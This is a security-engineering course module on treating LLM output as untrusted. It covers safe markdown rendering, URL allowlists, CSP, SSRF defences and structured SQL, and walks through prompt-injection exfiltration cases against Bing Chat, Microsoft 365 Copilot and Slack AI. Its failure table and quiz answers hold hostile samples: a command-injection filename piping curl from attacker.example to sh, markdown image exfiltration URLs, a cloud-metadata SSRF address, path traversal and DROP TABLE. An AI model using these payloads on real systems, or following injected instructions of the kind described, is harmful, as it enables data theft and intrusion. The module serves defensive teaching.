---
id: "3.4"
title: "Output Handling and Egress Control"
slug: output-handling-and-egress
module: security-engineering
sectionOrder: 4
description: "Treating model output as untrusted input to browsers, databases, shells, and HTTP clients, and closing the markdown and URL channels that carry data out."
category: security
controlLayers: [deterministic]
knowledge:
  - "Model output is attacker-influenced whenever untrusted content reached the context, so it must be encoded or validated for every downstream interpreter (OWASP LLM05:2025)."
  - "Rendered markdown images are fetched automatically, so a model-written image URL with data in its query string exfiltrates with zero clicks; links need one click."
  - "Sanitize the rendered HTML, not the markdown source, so reference-style links and images cannot slip past a markdown-level filter."
  - "URL allowlists must compare the parsed hostname exactly, require https, and treat query strings on allowed hosts as a possible channel."
  - "A content security policy (img-src, connect-src) is a browser-enforced backstop, but any allowed domain that can relay requests becomes an exfiltration path."
  - "SSRF defenses for model-chosen URLs combine allowlists, resolved-IP checks, no automatic redirects, and an egress proxy that enforces policy at connect time."
skills:
  - "Implement safe rendering of model output with a markdown renderer that disables raw HTML and an allowlist-based HTML sanitizer."
  - "Design a database or shell integration where the model supplies parameters, never executable syntax."
  - "Implement URL validation for a model-driven fetch tool and route it through an egress proxy."
  - "Write a content security policy for a chat interface that blocks image-based exfiltration."
sources:
  - title: "OWASP Top 10 for LLM Applications 2025: LLM05 Improper Output Handling"
    url: "https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/"
  - title: "Rehberger (2023), Bing Chat: Data Exfiltration Exploit Explained"
    url: "https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/"
  - title: "Infosecurity Magazine (2025), Microsoft 365 Copilot: New Zero-Click AI Vulnerability Allows Corporate Data Theft"
    url: "https://www.infosecurity-magazine.com/news/microsoft-365-copilot-zeroclick-ai"
  - title: "PromptArmor (2024), Data Exfiltration from Slack AI via indirect prompt injection"
    url: "https://promptarmor.substack.com/p/data-exfiltration-from-slack-ai-via"
  - title: "OWASP Server-Side Request Forgery Prevention Cheat Sheet"
    url: "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"
  - title: "MCP Security Best Practices: Server-Side Request Forgery"
    url: "https://modelcontextprotocol.io/specification/draft/basic/security_best_practices"
  - title: "MDN: Content-Security-Policy img-src"
    url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/img-src"
  - title: "nh3 documentation"
    url: "https://nh3.readthedocs.io/en/latest/"
lastReviewed: "2026-10-14"
---

# 3.4 Output Handling and Egress Control

## The problem

In April 2023, Johann Rehberger reported to Microsoft that Bing Chat would render markdown images written by the model. A web page the user asked Bing to read contained hidden instructions: summarize the conversation, URL-encode it, and write an image tag pointing to the attacker's server with the summary in the query string. The browser fetched the "image" automatically. Microsoft fixed it by mid-June 2023; Rehberger believed the fix was a content security policy restricting image sources (Rehberger, 2023).

Two years later EchoLeak used the same channel against Microsoft 365 Copilot. Copilot redacted external markdown links and images by then. The attack used reference-style markdown (`![x][ref]` with `[ref]: https://...` on a separate line), which the redaction did not catch, and pointed the image at a Microsoft Teams URL that the page's content security policy allowed and that would fetch an attacker-supplied URL on its behalf. In 2024 the Slack AI attack used a plain link labeled "click here to reauthenticate" with a secret in its query string ([incident](/incidents/slack-ai-exfiltration)).

The model did nothing in any of these but write text. The damage happened when other software interpreted that text.

## Why it happens

Model output goes to interpreters: a browser rendering markdown or HTML, a database running SQL, a shell, an HTTP client fetching a URL the model chose, a file system path, an email template. Each interpreter has its own syntax for "code," and the model can produce that syntax. If any untrusted content reached the context, the output is attacker-influenced. Treat it the way you treat a form field submitted by an anonymous user (OWASP LLM05:2025).

| Interpreter | Failure | Example |
|---|---|---|
| Browser | XSS | Model output with `<img src=x onerror=...>` inserted with `innerHTML`. |
| Browser | Exfiltration via auto-loaded resources | Markdown image to `https://attacker.example/p?d=<secret>`. |
| Browser / user | Exfiltration or phishing via links | "Click to verify" link carrying data in the query. |
| Database | SQL injection | Model writes `...; DROP TABLE` or reads tables the user cannot. |
| Shell | Command injection | Model-chosen filename `report.pdf; curl attacker.example \| sh`. |
| HTTP client | SSRF | Model fetches `http://169.254.169.254/latest/meta-data/` from inside your network. |
| File system | Path traversal | Model-chosen path `../../etc/passwd`. |

Exfiltration through rendering is the quiet one. An image tag is fetched with no click, and the request looks like ordinary page traffic.

## Control patterns

All of these are deterministic controls. They do not depend on detecting the attack.

### 1. Never give the model executable syntax

The strongest pattern is that the model chooses values, and your code builds the syntax.

- **SQL**: the model fills a structured request (`{"metric": "revenue", "region": "EMEA", "quarter": "2026-Q2"}`); your code validates each field against an enum or type and runs a parameterized query. If you must run model-written SQL (analytics assistants), run it as a read-only database role scoped to the caller with row-level security, a statement timeout, and a parser-based check that it is a single `SELECT`.
- **Shell**: do not pass model output to a shell. Use an argument list with a fixed, allowlisted program, validate each argument, and run in a sandbox (Domain 5).
- **Paths**: resolve the path and check it is inside the allowed directory after resolution.

### 2. Encode and sanitize for the renderer

- Render markdown with raw HTML disabled.
- Sanitize the resulting HTML with an allowlist sanitizer (for example, nh3 in Python or DOMPurify in the browser). Sanitizing the rendered HTML means reference-style links and images are handled the same as inline ones, because by then they are all `<a>` and `<img>` elements.
- Allow images only from hosts you control, or not at all. Strip query strings and fragments from any URL you keep.
- For links, require https and an exact host allowlist, or render the URL as plain text that the user must copy. If you show external links, show the full destination.

### 3. Content security policy (browser-enforced backstop)

Set `img-src`, `connect-src`, `script-src`, and `frame-ancestors` on the page that renders model output. CSP stops the browser from loading an image from a host the sanitizer missed. It is only as tight as its allowlist: EchoLeak passed CSP because an allowed domain would relay a request.

### 4. Egress control for server-side fetches

For any tool where the model chooses a URL (web fetch, webhook, image download):

- Prefer a fixed set of allowed hosts, compared exactly on the parsed hostname.
- If open-web fetching is required, resolve the hostname, reject private, loopback, link-local, and metadata addresses, connect to the validated address, and disable automatic redirects (OWASP SSRF Cheat Sheet).
- Route all agent egress through an egress proxy that enforces the same policy at connect time. The MCP security best practices recommend proxies such as Smokescreen for this, because validating in application code alone leaves a time-of-check to time-of-use gap with DNS rebinding.
- Put the agent's network in a segment that cannot reach internal services directly (Domain 5, section 5.2).

## Implementation

### Rendering model output

```python
from urllib.parse import urlsplit, urlunsplit

import nh3
from markdown_it import MarkdownIt

ALLOWED_LINK_HOSTS = frozenset({"docs.example.com", "help.example.com"})
ALLOWED_IMAGE_HOSTS = frozenset({"static.example.com"})

# "commonmark" preset with html=False: raw HTML in the model output is
# escaped as text instead of passed through.
_md = MarkdownIt("commonmark", {"html": False})


def _clean_url(url: str, allowed_hosts: frozenset) -> str | None:
    """Return a safe URL or None. Exact host match on the parsed URL."""
    try:
        parts = urlsplit(url.strip())
    except ValueError:
        return None
    if parts.scheme != "https":
        return None
    # .hostname drops userinfo and port and lowercases, so
    # https://docs.example.com@evil.example/ yields evil.example.
    try:
        host = (parts.hostname or "").rstrip(".")
        port = parts.port
    except ValueError:
        return None
    if host not in allowed_hosts:
        return None
    netloc = host if port is None else f"{host}:{port}"
    # Rebuild from parsed parts: no userinfo, no query, no fragment.
    # Query strings are a data channel even on allowed hosts.
    return urlunsplit(("https", netloc, parts.path, "", ""))


def _attribute_filter(tag: str, attr: str, value: str) -> str | None:
    if tag == "a" and attr == "href":
        return _clean_url(value, ALLOWED_LINK_HOSTS)
    if tag == "img" and attr == "src":
        return _clean_url(value, ALLOWED_IMAGE_HOSTS)
    return value


def render_model_output(markdown_text: str) -> str:
    html_out = _md.render(markdown_text)
    return nh3.clean(
        html_out,
        tags={"p", "br", "strong", "em", "code", "pre", "ul", "ol", "li",
              "blockquote", "a", "img", "h3", "h4", "table", "thead",
              "tbody", "tr", "th", "td"},
        attributes={"a": {"href"}, "img": {"src", "alt"}},
        attribute_filter=_attribute_filter,
        url_schemes={"https"},
        link_rel="noopener noreferrer nofollow",
    )
```

An `<img>` whose `src` was dropped renders as a broken image with no request. A link whose `href` was dropped renders as text. Both are visible to the user, which is the right failure mode.

Pair it with a response header on the chat page:

```text
Content-Security-Policy: default-src 'self'; script-src 'self';
  img-src 'self' https://static.example.com; connect-src 'self';
  frame-ancestors 'none'; base-uri 'none'; form-action 'self'
```

(Sent as one header line.) Audit every host in `img-src` and `connect-src`: if it offers an open redirect, an image proxy, or any endpoint that fetches a caller-supplied URL, it is an exfiltration path.

### Model-chosen URLs on the server

```python
import ipaddress
import socket
from urllib.parse import urlsplit

FETCH_ALLOWED_HOSTS = frozenset({"api.weather.example", "en.wikipedia.org"})


class EgressDenied(Exception):
    pass


def validate_fetch_target(url: str) -> tuple[str, list[str]]:
    """Validate a model-chosen URL. Returns (hostname, validated IPs).

    Application-level check only. The egress proxy must enforce the same
    policy at connect time, because DNS can change between this check and
    the connection (rebinding).
    """
    parts = urlsplit(url)
    if parts.scheme != "https" or parts.username or parts.password:
        raise EgressDenied("https only, no credentials in URL")
    host = (parts.hostname or "").rstrip(".")
    if host not in FETCH_ALLOWED_HOSTS:
        raise EgressDenied(f"host not allowlisted: {host!r}")
    infos = socket.getaddrinfo(host, parts.port or 443, proto=socket.IPPROTO_TCP)
    ips = sorted({info[4][0] for info in infos})
    if not ips:
        raise EgressDenied("no addresses")
    for ip in ips:
        addr = ipaddress.ip_address(ip)
        if not addr.is_global:
            raise EgressDenied(f"{host} resolves to non-public address {ip}")
    return host, ips


def fetch_for_agent(url: str, http_client) -> bytes:
    validate_fetch_target(url)
    # The client is configured to use the egress proxy and to NOT follow
    # redirects; a redirect is returned to the agent as a new URL that goes
    # through validate_fetch_target again.
    resp = http_client.get(url, follow_redirects=False, timeout=10)
    return resp.content[:1_000_000]
```

`is_global` is false for private, loopback, link-local (including 169.254.169.254), and other reserved ranges. Use the standard library rather than hand-written range checks, which tend to miss octal, hexadecimal, and IPv6 forms of the same address.

### Structured database access

```python
ALLOWED_METRICS = {"revenue": "revenue_usd", "orders": "order_count"}
ALLOWED_REGIONS = {"EMEA", "AMER", "APAC"}


def run_metric_query(conn, principal, request: dict):
    """The model produced `request`; it never writes SQL."""
    column = ALLOWED_METRICS.get(request.get("metric"))
    region = request.get("region")
    if column is None or region not in ALLOWED_REGIONS:
        raise ValueError("invalid metric or region")
    # The column name comes from our own mapping, never from the model.
    sql = f"SELECT quarter, SUM({column}) FROM sales WHERE tenant_id = %s AND region = %s GROUP BY quarter"
    with conn.cursor() as cur:
        cur.execute(sql, (principal.tenant_id, region))
        return cur.fetchall()
```

The tenant comes from the authenticated principal, not from the model's request (section 3.5).

## Where it breaks

- **Allowlisted hosts that relay.** EchoLeak passed a CSP because an allowed Microsoft domain would fetch an attacker URL. Open redirects, URL previewers, image proxies, and analytics endpoints on allowed hosts do the same.
- **Paths as a channel.** Stripping query strings does not stop data encoded in a path (`https://allowed.example/<data>.png`) if anyone who reads that host's logs is hostile. Allowlist hosts you control.
- **Links need only a click.** Users click "reauthenticate" links. Rendering external links as plain text is safer for high-risk deployments.
- **Other channels.** Data can leave through tool calls (send email, create a pull request), DNS lookups, file writes to shared locations, and text the user copies elsewhere. Rendering controls do not cover these; sections 3.2 and 3.6 and Domain 5 do.
- **Sanitizers** are only as good as their allowlist and version. Keep them updated, and do not add `style`, `iframe`, `svg`, or event-handler attributes to the allowlist.
- **Model-written SQL** under a read-only role can still read everything that role can read. Row-level security keyed on the caller is what bounds it.
- **Application-level SSRF checks** race with DNS. Without proxy or network enforcement, a rebinding domain can pass validation and then resolve to an internal address.

## Lab exercise

In [Lab 3: Security Hardening](/labs/lab-3-security-hardening), Task 3.4 has you exploit the lab chat UI with a reference-style markdown image that exfiltrates a secret, then close it with HTML sanitization, a URL allowlist, and a content security policy, and route the agent's fetch tool through the lab's egress proxy.

## Check your understanding

1. Your filter removes `![...](http...)` patterns from model output before rendering. Why is this insufficient, and what should you sanitize instead?
2. Your CSP allows images from `*.yourcompany.com`. One subdomain hosts a link-preview service that fetches any URL passed in its `?u=` parameter. What is the risk?
3. An agent's fetch tool allows a URL if the URL string contains `example.com`. Give two URLs that pass but should not.
4. Why does the server-side fetch check need an egress proxy in addition to resolving and checking the IP in application code?

<details>
<summary>Answers</summary>

1. Markdown has several syntaxes for the same element (reference-style links and images, autolinks, raw HTML if enabled). Render to HTML with raw HTML disabled, then sanitize the HTML elements and their URLs with an allowlist.
2. An injected image can point at the preview service with the attacker's URL and the stolen data in `u`. The browser allows it under CSP, and the service relays the data to the attacker, which is the EchoLeak pattern.
3. Any two of `https://example.com.attacker.io/`, `https://attacker.io/?next=example.com`, and `https://example.com@attacker.io/` (whose host is `attacker.io`). A suffix check has the same problem with `https://evilexample.com/`. Parse the URL and compare the hostname exactly against a set.
4. DNS can return a public address during validation and an internal one at connection time (rebinding). A proxy or network policy enforces the rule on the actual connection.

</details>
